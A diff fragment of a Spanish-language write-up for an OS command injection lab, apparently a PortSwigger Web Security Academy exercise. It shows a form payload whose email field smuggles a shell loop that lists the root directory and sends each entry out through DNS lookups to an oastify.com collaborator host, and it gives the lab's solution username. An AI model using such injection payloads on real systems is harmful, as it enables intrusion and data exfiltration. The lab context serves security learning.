@@ -61,3 +61,7 @@ Si necesitamos obtener más de una línea podemos usar este otro `payload` de `H
 ```
 csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||for+i+in+$(ls+/);+do+host+"$i.4gldmy40fg4hv4kv15r3mw6pigo7c50u.oastify.com";+done||&subject=test&message=test
 ```
+
+Pulsamos en `Submit solution` e `introducimos` el nombre de usuario `peter-qflr5j`
+
+![](/assets/img/OS-Command-Injection-Lab-5/image_6.png)
